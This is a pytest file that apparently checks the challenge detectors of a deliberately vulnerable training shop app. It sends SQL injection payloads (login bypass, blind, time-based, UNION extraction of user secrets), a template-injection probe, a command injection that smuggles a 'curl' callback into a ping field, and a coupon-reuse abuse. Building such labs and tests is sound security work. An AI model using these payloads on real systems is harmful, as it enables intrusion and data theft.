"""Phase B vertical slice — Injection family + one of each oracle mechanism."""
import time
import requests
from conftest import solved


def S(server):  # fresh session per exploit (clean actor)
    s = requests.Session()
    return s


# ---------- sink-predicate ----------

def test_sqli_login_bypass(server):
    s = S(server)
    s.post(f"{server['base']}/retail/login",
           data={"email": "alice@example.com' -- ", "password": "wrong"})
    assert "sqli-login-bypass" in solved(server)


def test_sqli_error_search(server):
    s = S(server)
    s.get(f"{server['base']}/search", params={"q": "lime'"})
    assert "sqli-error-search" in solved(server)


def test_sqli_blind_boolean(server):
    s = S(server)
    s.get(f"{server['base']}/products",
          params={"in_stock": "1 AND substr((SELECT secret FROM users LIMIT 1),1,1)='S'"})
    assert "sqli-blind-boolean" in solved(server)


def test_sqli_time_based(server):
    s = S(server)
    s.get(f"{server['base']}/retail/track", params={"ref": "x' OR sleep(2)-- "})
    assert "sqli-time-based" in solved(server)


def test_ssti_giftmessage(server):
    s = S(server)
    s.post(f"{server['base']}/retail/cart/giftmessage", data={"message": "{{7*7}}"})
    assert "ssti-jinja-giftmessage" in solved(server)


# ---------- canary ----------

def test_sqli_union_canary(server):
    s = S(server)
    s.get(f"{server['base']}/products",
          params={"category": "zz' UNION SELECT id,email,secret,loyalty FROM users-- "})
    assert "sqli-union-products" in solved(server)


# ---------- oast ----------

def test_blind_command_injection_oast(server):
    s = S(server)
    s.post(f"{server['base']}/admin/login",
           data={"username": "admin", "password": "admin"})
    tok = f"oob-{int(time.time()*1000)}"
    s.post(f"{server['base']}/admin/tools/ping",
           data={"host": f"127.0.0.1; curl -s {server['base']}/collab/{tok}"})
    time.sleep(2)
    assert "blind-command-injection" in solved(server)


# ---------- state-diff ----------

def test_coupon_reuse_state_diff(server):
    s = S(server)
    for _ in range(2):
        s.post(f"{server['base']}/retail/cart/apply-coupon",
               data={"code": "ONCE20", "subtotal": "100"})
    assert "coupon-reuse" in solved(server)


# ---------- NEGATIVE: benign traffic must NOT solve anything ----------

def test_benign_traffic_solves_nothing(server):
    s = S(server)
    s.get(f"{server['base']}/")
    s.get(f"{server['base']}/search", params={"q": "lime"})
    s.get(f"{server['base']}/products", params={"category": "Lime"})
    s.get(f"{server['base']}/retail/track", params={"ref": "SP-AAA111"})
    s.post(f"{server['base']}/retail/login",
           data={"email": "alice@example.com", "password": "password1"})
    s.post(f"{server['base']}/retail/cart/giftmessage", data={"message": "Happy Birthday!"})
    s.post(f"{server['base']}/retail/cart/apply-coupon",
           data={"code": "ONCE20", "subtotal": "100"})  # single legit use
    assert solved(server) == set()
